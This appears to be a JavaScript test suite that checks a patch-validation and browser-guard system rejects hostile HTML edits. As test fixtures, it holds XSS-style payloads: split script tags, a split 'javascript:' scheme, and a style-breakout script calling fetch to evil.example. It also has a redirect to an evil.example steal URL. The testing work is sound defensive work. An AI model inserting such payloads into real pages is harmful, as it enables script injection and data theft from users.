'use strict';

/**
 * B13 定向收口：
 *  - C12-P1-01/02/03：跨行标签/协议、删除注释/闭合标签 → 结构化拒绝
 *  - C12-P1-06：合法补丁（紧邻既有 script）不再误拒；真实 Spacer 合法补丁通过
 *  - C12-P1-05：新增 critical 失败计入 newFailures
 *  - C12-P1-04：修复必须绑定 defectId + 同一断言 before=false/after=true
 *  - C12-P1-07：HMAC 链无 key 验证必须失败
 *  - 预览票据服务端项目绑定；Vision 票据不再是 admin
 *  - 跨源重定向在请求前阻断
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { pathToFileURL } = require('url');

const { createProjectRegistry } = require('../lib/projects.cjs');
const { createVisionService } = require('../lib/vision-service.cjs');
const { createDeltaPolicy } = require('../lib/vision-policy-delta.cjs');
const { createPreviewTicketStore } = require('../lib/preview-tickets.cjs');
const { createEventStore } = require('../lib/events.cjs');
const visionPolicy = require('../lib/vision-policy.cjs');
const { makeWorkspace, removeWorkspace } = require('./helpers.cjs');

const SPACER = 'G:\\AI_GAME\\Vplay-Vision-POC\\e05\\spacer-latest\\vector-lander\\index.html';
const policy = createDeltaPolicy({ policy: visionPolicy });

function sha256(text) {
  return crypto.createHash('sha256').update(text).digest('hex');
}

function write(file, content) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, content);
}

function op(before, oldString, newString, start = before.indexOf(oldString)) {
  assert.ok(start >= 0, `anchor not found: ${oldString.slice(0, 40)}`);
  return { start, end: start + oldString.length, oldString, newString };
}

function applyPatch(root, rel, before, after, operations) {
  return policy.applyDelta({
    root,
    files: [
      {
        file: rel,
        content: after,
        sha256Before: sha256(before),
        sha256After: sha256(after),
      },
    ],
    operations: operations.map((item) => ({ file: rel, ...item })),
    allowedFiles: [rel],
  });
}

function expectCode(fn, code) {
  assert.throws(fn, (error) => {
    assert.equal(error.code, code, `expected ${code}, got ${error.code}: ${error.message}`);
    return true;
  });
}

test('B13-C12-P1-01/02/03: cross-line tags, javascript scheme and broken structure are rejected', () => {
  const root = makeWorkspace('vplay-b13-struct-');
  try {
    // P1-01 跨行拆分 script 标签
    write(path.join(root, 'a.html'), '<div id="safe">ok</div>\n');
    let before = fs.readFileSync(path.join(root, 'a.html'), 'utf8');
    let after = before.replace('<div id="safe">ok</div>', '<scr\nipt>alert(1)</scr\nipt>');
    expectCode(
      () => applyPatch(root, 'a.html', before, after, [op(before, '<div id="safe">ok</div>', '<scr\nipt>alert(1)</scr\nipt>')]),
      'DELTA_CONTENT_REJECTED',
    );

    // P1-02 跨行拆分 javascript:
    write(path.join(root, 'b.html'), '<a id="l" href="/local">x</a>\n');
    before = fs.readFileSync(path.join(root, 'b.html'), 'utf8');
    after = before.replace('href="/local"', 'href="java\nscript:alert(1)"');
    expectCode(
      () => applyPatch(root, 'b.html', before, after, [op(before, 'href="/local"', 'href="java\nscript:alert(1)"')]),
      'DELTA_CONTENT_REJECTED',
    );

    // P1-03 删除注释闭合 + 无害新增
    write(path.join(root, 'c.html'), '<!-- note --><div id="safe">ok</div>\n');
    before = fs.readFileSync(path.join(root, 'c.html'), 'utf8');
    after = before.replace('-->', '').replace(
      '<div id="safe">ok</div>',
      '<div id="safe">ok</div><div id="new">safe</div>',
    );
    expectCode(
      () =>
        applyPatch(root, 'c.html', before, after, [
          op(before, '-->', ''),
          op(before, '<div id="safe">ok</div>', '<div id="safe">ok</div><div id="new">safe</div>'),
        ]),
      'DELTA_STRUCTURE_REJECTED',
    );

    // P1-03 删除 </style> + 无害新增
    write(path.join(root, 'd.html'), '<style>.a{color:red}</style><div>x</div>\n');
    before = fs.readFileSync(path.join(root, 'd.html'), 'utf8');
    after = before.replace('</style>', '').replace(
      '<div>x</div>',
      '<div>x</div><div id="new">safe</div>',
    );
    expectCode(
      () =>
        applyPatch(root, 'd.html', before, after, [
          op(before, '</style>', ''),
          op(before, '<div>x</div>', '<div>x</div><div id="new">safe</div>'),
        ]),
      'DELTA_STRUCTURE_REJECTED',
    );
  } finally {
    removeWorkspace(root);
  }
});

test('B13-C12-P1-06: legal patch adjacent to an existing script is accepted', () => {
  const root = makeWorkspace('vplay-b13-legal-');
  try {
    const before = '<script src="/app.js"></script><h1 id="t">T</h1>\n';
    write(path.join(root, 'index.html'), before);
    const after = before.replace('<h1 id="t">', '<h1 id="t" class="vision-safe">');
    const applied = applyPatch(root, 'index.html', before, after, [
      op(before, '<h1 id="t">', '<h1 id="t" class="vision-safe">'),
    ]);
    assert.equal(applied.files[0].file, 'index.html');
    assert.equal(fs.readFileSync(path.join(root, 'index.html'), 'utf8'), after);
  } finally {
    removeWorkspace(root);
  }
});

test('B13 real Spacer: legal CSS patch accepted, new script rejected', (t) => {
  if (!fs.existsSync(SPACER)) {
    t.skip('Spacer snapshot not available');
    return;
  }
  const root = makeWorkspace('vplay-b13-spacer-');
  try {
    const file = path.join(root, 'index.html');
    fs.copyFileSync(SPACER, file);
    const before = fs.readFileSync(file, 'utf8');
    const htmlAnchor = '<h1 id="gameTitle">VECTOR LANDER</h1>';
    if (before.includes(htmlAnchor)) {
      const htmlAfter = before.replace(
        htmlAnchor,
        '<h1 id="gameTitle" class="vision-safe">VECTOR LANDER</h1>',
      );
      const htmlApplied = applyPatch(root, 'index.html', before, htmlAfter, [
        op(before, htmlAnchor, '<h1 id="gameTitle" class="vision-safe">VECTOR LANDER</h1>'),
      ]);
      assert.equal(htmlApplied.files[0].file, 'index.html');
      assert.equal(sha256(fs.readFileSync(file, 'utf8')), sha256(htmlAfter));
    }
    const beforeCss = fs.readFileSync(file, 'utf8');
    const oldString = 'width:clamp(54px,22%,88px)';
    if (beforeCss.includes(oldString)) {
      const after = beforeCss.replace(oldString, 'width:clamp(56px,22%,88px)');
      const applied = applyPatch(root, 'index.html', beforeCss, after, [
        op(beforeCss, oldString, 'width:clamp(56px,22%,88px)'),
      ]);
      assert.equal(applied.files[0].file, 'index.html');
      assert.equal(sha256(fs.readFileSync(file, 'utf8')), sha256(after));
      const current = fs.readFileSync(file, 'utf8');
      const injected = current.replace(
        'width:clamp(56px,22%,88px)',
        'width:clamp(56px,22%,88px)}</style><script>fetch("https://evil.example/x")</script><style>',
      );
      assert.throws(
        () =>
          applyPatch(root, 'index.html', current, injected, [
            op(current, 'width:clamp(56px,22%,88px)', 'width:clamp(56px,22%,88px)}</style><script>fetch("https://evil.example/x")</script><style>'),
          ]),
        (error) => ['DELTA_CONTENT_REJECTED', 'DELTA_STRUCTURE_REJECTED'].includes(error.code),
      );
      assert.equal(fs.readFileSync(file, 'utf8'), current);
    } else {
      t.skip('known Spacer CSS anchor not found');
    }
  } finally {
    removeWorkspace(root);
  }
});

test('B13-C12-P1-05: after-only failing assertion is a new failure, not persisting', async () => {
  const mod = await import(pathToFileURL(path.join(__dirname, '..', '..', 'vendor', 'vision', 'src', 'verification', 'compare.mjs')).href);
  const before = {
    ok: true,
    viewports: [
      { viewport: 'desktop', ok: true, assertions: [{ id: 'a', ok: true, critical: true }] },
    ],
    screenshots: [],
  };
  const after = {
    ok: false,
    viewports: [
      {
        viewport: 'desktop',
        ok: false,
        assertions: [
          { id: 'a', ok: true, critical: true },
          { id: 'b', ok: false, critical: true },
        ],
      },
    ],
    screenshots: [],
  };
  const comparison = mod.compareVerification({ before, after, defect: { id: 'V-1' } });
  assert.equal(comparison.newCriticalFailures.length, 1);
  assert.equal(comparison.newCriticalFailures[0].id, 'b');
  assert.equal(comparison.persistingFailures.length, 0);
  assert.equal(comparison.ok, false);
});

function makeFakeVision(comparison) {
  return {
    createEventSink: ({ onEvent }) => ({
      events: [],
      emit(type, payload) {
        if (onEvent) onEvent({ type, payload });
      },
    }),
    createSpacerAdapter: () => ({ id: 'fake', viewports: [], ready: async () => {}, assert: async () => [] }),
    redactSource: (text) => ({ text, findings: [], truncated: false }),
    redactObject: (value) => value,
    runVisionTask: async () => ({
      ok: true,
      status: 'repaired',
      validation: { ok: true },
      comparison,
    }),
  };
}

function viewport(assertions) {
  return { viewports: [{ viewport: 'desktop', beforeOk: false, afterOk: true, assertions }] };
}

test('B13-C12-P1-04: repair requires the same defect assertion before=false/after=true', async () => {
  const root = makeWorkspace('vplay-b13-defect-');
  const home = path.join(root, 'home');
  try {
    const registry = createProjectRegistry({ home });
    write(path.join(root, 'src', 'index.html'), '<h1>v1</h1>\n');
    registry.importProject({ sourceDir: path.join(root, 'src'), id: 'demo' });

    const base = {
      ok: true,
      beforeOk: false,
      afterOk: true,
      newFailures: [],
      newCriticalFailures: [],
      screenshotsChanged: true,
      ...viewport([{ id: 'hud', before: false, after: true, critical: true }]),
    };
    const run = async (comparison, extra = {}) => {
      const service = createVisionService({
        registry,
        home,
        deps: {
          vision: makeFakeVision(comparison),
          consent: true,
          gateway: { summary: () => ({}) },
          browserRunner: { runCapture: async () => ({ ok: true, viewports: [], screenshots: [] }) },
        },
      });
      return service.run({
        taskId: `vision_${crypto.randomBytes(3).toString('hex')}`,
        projectId: 'demo',
        mode: 'repair',
        skipLock: false,
        defectId: 'V-001',
        defectAssertionIds: ['hud'],
        ...extra,
      });
    };

    const fixed = await run(base);
    assert.equal(fixed.result.ok, true);

    // 删除缺陷断言（after 缺失）→ 不通过
    const deleted = await run({
      ...base,
      ...viewport([{ id: 'other', before: false, after: true, critical: true }]),
    });
    assert.equal(deleted.result.ok, false);
    assert.equal(deleted.result.status, 'repair_unconfirmed');
    assert.equal(deleted.result.strictVerification.reason, 'defect-assertion-not-fixed');

    // 同一断言 before=true/after=true（缺陷不存在）→ 不通过
    const notFixed = await run({
      ...base,
      ...viewport([{ id: 'hud', before: true, after: true, critical: true }]),
    });
    assert.equal(notFixed.result.ok, false);

    // 新增 critical 失败 → 不通过
    const regression = await run({
      ...base,
      newFailures: [{ id: 'new-bug', critical: true }],
      newCriticalFailures: [{ id: 'new-bug', critical: true }],
      ...viewport([
        { id: 'hud', before: false, after: true, critical: true },
        { id: 'new-bug', before: null, after: false, critical: true },
      ]),
    });
    assert.equal(regression.result.ok, false);

    // 缺少 defectId / 断言绑定 → 不通过
    const unbound = await run(base, { defectId: null, defectAssertionIds: [] });
    assert.equal(unbound.result.ok, false);
    assert.equal(unbound.result.strictVerification.reason, 'defect-binding-missing');
  } finally {
    removeWorkspace(root);
  }
});

test('B13-verify: mode verify is a functional recheck, not repair_verified', async () => {
  const root = makeWorkspace('vplay-b13-verify-');
  const home = path.join(root, 'home');
  try {
    const registry = createProjectRegistry({ home });
    write(path.join(root, 'src', 'index.html'), '<h1>v1</h1>\n');
    registry.importProject({ sourceDir: path.join(root, 'src'), id: 'demo' });
    const vision = {
      createEventSink: () => ({ emit() {}, events: [] }),
      createSpacerAdapter: () => ({ id: 'fake', viewports: [], ready: async () => {}, assert: async () => [] }),
      redactSource: (text) => ({ text, findings: [] }),
      redactObject: (value) => value,
    };
    const service = createVisionService({
      registry,
      home,
      deps: {
        vision,
        consent: true,
        browserRunner: {
          runCapture: async () => ({
            ok: true,
            browserVersion: 'fake',
            viewports: [
              { viewport: 'desktop', ok: true, assertions: [{ id: 'hud', ok: true, critical: true }], diagnostics: { pageErrors: [] } },
            ],
            screenshots: [],
          }),
        },
      },
    });
    const output = await service.run({ taskId: 'verify_b13', projectId: 'demo', mode: 'verify' });
    assert.equal(output.result.status, 'verify_passed');
    assert.equal(output.result.repairVerified, false);
    assert.equal(output.result.verificationKind, 'functional_recheck');
    assert.equal(output.result.validation.kind, 'functional_recheck');
  } finally {
    removeWorkspace(root);
  }
});

test('B13-ticket: preview tickets are project-bound; admin is only for unbound login tickets', () => {
  const store = createPreviewTicketStore({ enabled: true, defaultTtlMs: 60000 });
  const projectTicket = store.issue({ projectId: 'demo', admin: false, ttlMs: 5000 });
  assert.equal(store.authorize(projectTicket, 'demo'), true);
  assert.equal(store.authorize(projectTicket, 'other'), false);
  assert.equal(store.authorize(projectTicket, null), true);

  const adminTicket = store.issue({ projectId: null, admin: true });
  assert.equal(store.authorize(adminTicket, 'other'), true);

  const expiring = store.issue({ projectId: 'demo', ttlMs: 1 });
  const start = Date.now();
  while (Date.now() - start < 5) {
    // busy wait for expiry
  }
  assert.equal(store.authorize(expiring, 'demo'), false);
  store.revoke(() => true);
  assert.equal(store.authorize(projectTicket, 'demo'), false);
});

test('B13-C12-P1-07: HMAC chain cannot verify without the key', () => {
  const root = makeWorkspace('vplay-b13-hmac-');
  const file = path.join(root, 'events', 'events.jsonl');
  try {
    const key = 'b13-hmac-key-0123456789';
    const store = createEventStore({ file, hmacKey: key });
    for (let i = 0; i < 3; i += 1) {
      store.append({ type: 'task.created', taskId: `t${i}`, projectId: 'demo' });
    }
    assert.equal(createEventStore({ file, hmacKey: key }).verify().ok, true);

    const noKey = createEventStore({ file }).verify();
    assert.equal(noKey.ok, false);
    assert.ok(noKey.problems.includes('HMAC_KEY_MISSING'));

    const wrongKey = createEventStore({ file, hmacKey: 'wrong-key-0123456789' }).verify();
    assert.equal(wrongKey.ok, false);

    assert.throws(
      () => createEventStore({ file, requireHmac: true }),
      /HMAC_KEY_MISSING|EVIDENCE_HMAC_KEY/,
    );
  } finally {
    removeWorkspace(root);
  }
});

test('B13-redirect: cross-origin redirect is blocked before the browser follows it', async () => {
  const mod = await import(
    pathToFileURL(path.join(__dirname, '..', '..', 'vendor', 'vision', 'src', 'browser', 'guard.mjs')).href
  );
  let handler = null;
  const calls = { fetched: [], fulfilled: 0, aborted: 0 };
  const fakeContext = {
    async addInitScript() {},
    async route(_pattern, fn) {
      handler = fn;
    },
    on() {},
  };
  const guard = await mod.installNetworkGuard({
    context: fakeContext,
    previewUrl: 'http://127.0.0.1:8788/p/demo/',
  });
  const request = {
    url: () => 'http://127.0.0.1:8788/p/demo/',
    method: () => 'GET',
    resourceType: () => 'document',
    isNavigationRequest: () => true,
    frame: () => null,
    allHeaders: async () => ({}),
  };
  const route = {
    request: () => request,
    async fetch(options = {}) {
      calls.fetched.push(options.url || request.url());
      if (!options.url) {
        return {
          status: () => 302,
          url: () => 'http://127.0.0.1:8788/p/demo/',
          headers: () => ({ location: 'https://evil.example/steal' }),
        };
      }
      return { status: () => 200, url: () => options.url, headers: () => ({}) };
    },
    async fulfill() {
      calls.fulfilled += 1;
    },
    async abort() {
      calls.aborted += 1;
    },
    async continue() {
      calls.fulfilled += 1;
    },
  };
  await handler(route);
  assert.equal(calls.aborted, 1);
  assert.equal(calls.fulfilled, 0);
  assert.equal(calls.fetched.some((url) => url.includes('evil.example')), false);
  assert.ok(guard.summary().redirectBlocked >= 1);
});
